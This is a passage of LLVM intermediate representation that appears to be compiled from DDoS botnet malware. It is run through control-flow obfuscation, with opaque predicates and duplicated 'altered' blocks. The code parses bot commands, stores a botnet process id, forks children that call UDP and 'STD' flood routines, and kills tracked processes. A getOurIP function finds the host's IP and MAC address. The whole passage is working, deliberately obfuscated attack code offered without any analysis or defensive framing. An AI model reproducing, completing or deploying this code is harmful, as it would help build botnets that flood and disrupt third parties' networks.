  %1057 = alloca i8*, align 8
  %1058 = alloca i32, align 4
  %1059 = alloca i32, align 4
  %1060 = alloca i32, align 4
  %1061 = alloca i8*, align 8
  %1062 = alloca i32, align 4
  %1063 = alloca i32, align 4
  %1064 = alloca i8*, align 8
  %1065 = alloca i8*, align 8
  %1066 = alloca i32, align 4
  %1067 = alloca i32, align 4
  %1068 = alloca i8*, align 8
  %1069 = alloca i32, align 4
  %1070 = alloca i64, align 8
  store i32 %0, i32* %1043, align 4
  store i8** %1, i8*** %1044, align 8
  %1071 = load i8**, i8*** %1044, align 8
  %1072 = getelementptr inbounds i8*, i8** %1071, i64 0
  %1073 = load i8*, i8** %1072, align 8
  %1074 = call i32 @strcmp(i8* %1073, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0)) #9
  %1075 = icmp ne i32 %1074, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  %1076 = load i8**, i8*** %12, align 8
  %1077 = getelementptr inbounds i8*, i8** %1076, i64 1
  %1078 = load i8*, i8** %1077, align 8
  %1079 = call i32 @strcmp(i8* %1078, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.127, i32 0, i32 0)) #9
  %1080 = icmp ne i32 %1079, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %95
  %1081 = load i32, i32* %13, align 4
  store i32 %1081, i32* @botnetPid, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %117
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %138
  %1082 = load i8**, i8*** %12, align 8
  %1083 = getelementptr inbounds i8*, i8** %1082, i64 0
  %1084 = load i8*, i8** %1083, align 8
  %1085 = call i32 @strcmp(i8* %1084, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.128, i32 0, i32 0)) #9
  %1086 = icmp ne i32 %1085, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %160
  %1087 = load i32, i32* %11, align 4
  %1088 = icmp slt i32 %1087, 6
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %191
  %1089 = load i8**, i8*** %12, align 8
  %1090 = getelementptr inbounds i8*, i8** %1089, i64 4
  %1091 = load i8*, i8** %1090, align 8
  %1092 = call i32 @atoi(i8* %1091) #9
  %1093 = icmp eq i32 %1092, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %219
  %1094 = load i8**, i8*** %12, align 8
  %1095 = getelementptr inbounds i8*, i8** %1094, i64 5
  %1096 = load i8*, i8** %1095, align 8
  %1097 = call i32 @atoi(i8* %1096) #9
  %1098 = icmp sgt i32 %1097, 65536
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %316
  %1099 = load i8*, i8** %16, align 8
  %1100 = call i8* @strtok(i8* %1099, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %1100, i8** %24, align 8
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %350
  %1101 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %1101, i8** %24, align 8
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %372
  %1102 = load i8*, i8** %16, align 8
  %1103 = load i32, i32* %17, align 4
  %1104 = load i32, i32* %18, align 4
  %1105 = load i32, i32* %19, align 4
  %1106 = load i32, i32* %20, align 4
  %1107 = load i32, i32* %21, align 4
  %1108 = load i32, i32* %22, align 4
  %1109 = load i32, i32* %23, align 4
  call void @sendUDP(i8* %1102, i32 %1103, i32 %1104, i32 %1105, i32 %1106, i32 %1107, i32 %1108, i32 %1109)
  call void @_exit(i32 0) #12
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %397
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %436
  %1110 = load i8**, i8*** %12, align 8
  %1111 = getelementptr inbounds i8*, i8** %1110, i64 4
  %1112 = load i8*, i8** %1111, align 8
  %1113 = call i32 @atoi(i8* %1112) #9
  %1114 = icmp eq i32 %1113, -1
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %458
  %1115 = load i8**, i8*** %12, align 8
  %1116 = getelementptr inbounds i8*, i8** %1115, i64 4
  %1117 = load i8*, i8** %1116, align 8
  %1118 = call i32 @atoi(i8* %1117) #9
  %1119 = icmp sgt i32 %1118, 32
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %480
  %1120 = load i32, i32* %11, align 4
  %1121 = icmp sgt i32 %1120, 6
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %499
  %1122 = load i8**, i8*** %12, align 8
  %1123 = getelementptr inbounds i8*, i8** %1122, i64 6
  %1124 = load i8*, i8** %1123, align 8
  %1125 = call i32 @atoi(i8* %1124) #9
  %1126 = icmp slt i32 %1125, 0
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %530
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %568
  %1127 = load i8**, i8*** %12, align 8
  %1128 = getelementptr inbounds i8*, i8** %1127, i64 7
  %1129 = load i8*, i8** %1128, align 8
  %1130 = call i32 @atoi(i8* %1129) #9
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %600
  store i32 %601, i32* %31, align 4
  %1131 = load i8*, i8** %25, align 8
  %1132 = call i8* @strstr(i8* %1131, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #9
  %1133 = icmp ne i8* %1132, null
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %627
  %1134 = call i32 @listFork()
  %1135 = icmp ne i32 %1134, 0
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %656
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %686
  %1136 = load i8**, i8*** %12, align 8
  %1137 = getelementptr inbounds i8*, i8** %1136, i64 0
  %1138 = load i8*, i8** %1137, align 8
  %1139 = call i32 @strcmp(i8* %1138, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.130, i32 0, i32 0)) #9
  %1140 = icmp ne i32 %1139, 0
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %711
  %1141 = load i8**, i8*** %12, align 8
  %1142 = getelementptr inbounds i8*, i8** %1141, i64 3
  %1143 = load i8*, i8** %1142, align 8
  %1144 = call i32 @atoi(i8* %1143) #9
  %1145 = icmp slt i32 %1144, 1
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %740
  %1146 = call i32 @listFork()
  %1147 = icmp ne i32 %1146, 0
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %783
  %1148 = load i8**, i8*** %12, align 8
  %1149 = getelementptr inbounds i8*, i8** %1148, i64 0
  %1150 = load i8*, i8** %1149, align 8
  %1151 = call i32 @strcmp(i8* %1150, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0)) #9
  %1152 = icmp ne i32 %1151, 0
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %805
  %1153 = load i32, i32* %11, align 4
  %1154 = icmp slt i32 %1153, 4
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %830
  %1155 = load i8**, i8*** %12, align 8
  %1156 = getelementptr inbounds i8*, i8** %1155, i64 3
  %1157 = load i8*, i8** %1156, align 8
  %1158 = call i32 @atoi(i8* %1157) #9
  %1159 = icmp slt i32 %1158, 1
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %871
  %1160 = load i8*, i8** %36, align 8
  %1161 = icmp ne i8* %1160, null
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %899
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %919
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %936
  %1162 = load i8*, i8** %33, align 8
  %1163 = load i32, i32* %34, align 4
  %1164 = load i32, i32* %35, align 4
  call void @sendSTD(i8* %1162, i32 %1163, i32 %1164)
  call void @_exit(i32 0) #12
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %957
  %1165 = load i8**, i8*** %12, align 8
  %1166 = getelementptr inbounds i8*, i8** %1165, i64 0
  %1167 = load i8*, i8** %1166, align 8
  %1168 = call i32 @strcmp(i8* %1167, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.132, i32 0, i32 0)) #9
  %1169 = icmp ne i32 %1168, 0
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %984
  %1170 = load i32*, i32** @pids, align 8
  %1171 = load i64, i64* %38, align 8
  %1172 = getelementptr inbounds i32, i32* %1170, i64 %1171
  %1173 = load i32, i32* %1172, align 4
  %1174 = icmp ne i32 %1173, 0
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1013
  %1175 = load i32*, i32** @pids, align 8
  %1176 = load i64, i64* %38, align 8
  %1177 = getelementptr inbounds i32, i32* %1175, i64 %1176
  %1178 = load i32, i32* %1177, align 4
  %1179 = call i32 @kill(i32 %1178, i32 9) #3
  %1180 = load i32, i32* %37, align 4
  %_ = sub i32 0, %1180
  %gen = add i32 %_, 1
  %_131 = sub i32 %1180, 1
  %gen132 = mul i32 %_131, 1
  %_133 = shl i32 %1180, 1
  %_134 = shl i32 %1180, 1
  %_135 = shl i32 %1180, 1
  %_136 = shl i32 %1180, 1
  %_137 = sub i32 %1180, 1
  %gen138 = mul i32 %_137, 1
  %1181 = add nsw i32 %1180, 1
  store i32 %1181, i32* %37, align 4
  br label %originalBB130
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.105
  %17 = load i32, i32* @y.106
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %1, align 4
  %24 = load i32, i32* @x.105
  %25 = load i32, i32* @y.106
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %277

; <label>:32:                                     ; preds = %0
  %33 = load i32, i32* @x.105
  %34 = load i32, i32* @y.106
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 16, i32 4, i1 false)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.133, i32 0, i32 0)) #3
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  store i32 %43, i32* %45, align 4
  %46 = call zeroext i16 @htons(i16 zeroext 53) #10
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* %2, align 4
  %49 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %4, align 4
  %51 = load i32, i32* %4, align 4
  %52 = icmp eq i32 %51, -1
  %53 = load i32, i32* @x.105
  %54 = load i32, i32* @y.106
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %62

; <label>:61:                                     ; preds = %originalBBpart24
  store i32 0, i32* %1, align 4
  br label %277

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* @x.105
  %64 = load i32, i32* @y.106
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  store i32 16, i32* %6, align 4
  %71 = load i32, i32* %2, align 4
  %72 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %73 = call i32 @getsockname(i32 %71, %struct.sockaddr* %72, i32* %6) #3
  store i32 %73, i32* %4, align 4
  %74 = load i32, i32* %4, align 4
  %75 = icmp eq i32 %74, -1
  %76 = load i32, i32* @x.105
  %77 = load i32, i32* @y.106
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %101

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i32, i32* @x.105
  %86 = load i32, i32* @y.106
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  store i32 0, i32* %1, align 4
  %93 = load i32, i32* @x.105
  %94 = load i32, i32* @y.106
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %277

; <label>:101:                                    ; preds = %originalBBpart28
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  store i32 %104, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %105 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.134, i32 0, i32 0), i32 0)
  store i32 %105, i32* %7, align 4
  br label %106

; <label>:106:                                    ; preds = %originalBBpart228, %101
  %107 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %108 = load i32, i32* %7, align 4
  %109 = call i8* @fdgets(i8* %107, i32 4096, i32 %108)
  %110 = icmp ne i8* %109, null
  br i1 %110, label %111, label %193

; <label>:111:                                    ; preds = %106
  %112 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %113 = call i8* @strstr(i8* %112, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.135, i32 0, i32 0)) #9
  %114 = icmp ne i8* %113, null
  br i1 %114, label %115, label %175

; <label>:115:                                    ; preds = %111
  %116 = load i32, i32* @x.105
  %117 = load i32, i32* @y.106
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %115
  %124 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %124, i8** %9, align 8
  %125 = load i32, i32* @x.105
  %126 = load i32, i32* @y.106
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %133

; <label>:133:                                    ; preds = %originalBBpart220, %originalBBpart216
  %134 = load i8*, i8** %9, align 8
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp ne i32 %136, 9
  br i1 %137, label %138, label %157

; <label>:138:                                    ; preds = %133
  %139 = load i32, i32* @x.105
  %140 = load i32, i32* @y.106
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %138
  %147 = load i8*, i8** %9, align 8
  %148 = getelementptr inbounds i8, i8* %147, i32 1
  store i8* %148, i8** %9, align 8
  %149 = load i32, i32* @x.105
  %150 = load i32, i32* @y.106
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %133

; <label>:157:                                    ; preds = %133
  %158 = load i32, i32* @x.105
  %159 = load i32, i32* @y.106
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %157
  %166 = load i8*, i8** %9, align 8
  store i8 0, i8* %166, align 1
  %167 = load i32, i32* @x.105
  %168 = load i32, i32* @y.106
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %193

; <label>:175:                                    ; preds = %111
  %176 = load i32, i32* @x.105
  %177 = load i32, i32* @y.106
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %175
  %184 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %184, i8 0, i64 4096, i32 16, i1 false)
  %185 = load i32, i32* @x.105
  %186 = load i32, i32* @y.106
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %106

; <label>:193:                                    ; preds = %originalBBpart224, %106
  %194 = load i32, i32* @x.105
  %195 = load i32, i32* @y.106
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %193
  %202 = load i32, i32* %7, align 4
  %203 = call i32 @close(i32 %202)
  %204 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %205 = load i8, i8* %204, align 16
  %206 = icmp ne i8 %205, 0
  %207 = load i32, i32* @x.105
  %208 = load i32, i32* @y.106
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %206, label %215, label %274

; <label>:215:                                    ; preds = %originalBBpart232
  %216 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %217 = bitcast %union.anon.4* %216 to [16 x i8]*
  %218 = getelementptr inbounds [16 x i8], [16 x i8]* %217, i32 0, i32 0
  %219 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %220 = call i8* @strcpy(i8* %218, i8* %219) #3
  %221 = load i32, i32* %2, align 4
  %222 = call i32 (i32, i64, ...) @ioctl(i32 %221, i64 35111, %struct.ifreq* %11) #3
  store i32 0, i32* %10, align 4
  br label %223

; <label>:223:                                    ; preds = %254, %215
  %224 = load i32, i32* %10, align 4
  %225 = icmp slt i32 %224, 6
  br i1 %225, label %226, label %257

; <label>:226:                                    ; preds = %223
  %227 = load i32, i32* @x.105
  %228 = load i32, i32* @y.106
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %226
  %235 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %236 = bitcast %union.anon.5* %235 to %struct.sockaddr*
  %237 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %236, i32 0, i32 1
  %238 = getelementptr inbounds [14 x i8], [14 x i8]* %237, i32 0, i32 0
  %239 = load i32, i32* %10, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds i8, i8* %238, i64 %240
  %242 = load i8, i8* %241, align 1
  %243 = load i32, i32* %10, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %244
  store i8 %242, i8* %245, align 1
  %246 = load i32, i32* @x.105
  %247 = load i32, i32* @y.106
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %254

; <label>:254:                                    ; preds = %originalBBpart236
  %255 = load i32, i32* %10, align 4
  %256 = add nsw i32 %255, 1
  store i32 %256, i32* %10, align 4
  br label %223

; <label>:257:                                    ; preds = %223
  %258 = load i32, i32* @x.105
  %259 = load i32, i32* @y.106
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %257
  %266 = load i32, i32* @x.105
  %267 = load i32, i32* @y.106
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %274

; <label>:274:                                    ; preds = %originalBBpart240, %originalBBpart232
  %275 = load i32, i32* %2, align 4
  %276 = call i32 @close(i32 %275)
  br label %277

; <label>:277:                                    ; preds = %274, %originalBBpart212, %61, %originalBBpart2
  %278 = load i32, i32* %1, align 4
  ret i32 %278

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %279 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %279, i8 0, i64 16, i32 4, i1 false)
  %280 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %280, align 4
  %281 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.133, i32 0, i32 0)) #3
  %282 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %283 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %282, i32 0, i32 0
  store i32 %281, i32* %283, align 4
  %284 = call zeroext i16 @htons(i16 zeroext 53) #10
  %285 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %284, i16* %285, align 2
  %286 = load i32, i32* %2, align 4
  %287 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %288 = call i32 @connect(i32 %286, %struct.sockaddr* %287, i32 16)
  store i32 %288, i32* %4, align 4
  %289 = load i32, i32* %4, align 4
  %290 = icmp eq i32 %289, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  store i32 16, i32* %6, align 4
  %291 = load i32, i32* %2, align 4
  %292 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %293 = call i32 @getsockname(i32 %291, %struct.sockaddr* %292, i32* %6) #3
  store i32 %293, i32* %4, align 4
  %294 = load i32, i32* %4, align 4
  %295 = icmp eq i32 %294, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  store i32 0, i32* %1, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %115
  %296 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %296, i8** %9, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %138
  %297 = load i8*, i8** %9, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %9, align 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %157
  %299 = load i8*, i8** %9, align 8
  store i8 0, i8* %299, align 1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %175
  %300 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %300, i8 0, i64 4096, i32 16, i1 false)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %193
  %301 = load i32, i32* %7, align 4
  %302 = call i32 @close(i32 %301)
  %303 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %304 = load i8, i8* %303, align 16
  %305 = icmp ne i8 %304, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %226
  %306 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %307 = bitcast %union.anon.5* %306 to %struct.sockaddr*
  %308 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %307, i32 0, i32 1
  %309 = getelementptr inbounds [14 x i8], [14 x i8]* %308, i32 0, i32 0
  %310 = load i32, i32* %10, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8, i8* %309, i64 %311
  %313 = load i8, i8* %312, align 1
  %314 = load i32, i32* %10, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %315
  store i8 %313, i8* %316, align 1
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %257
  br label %originalBB38
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
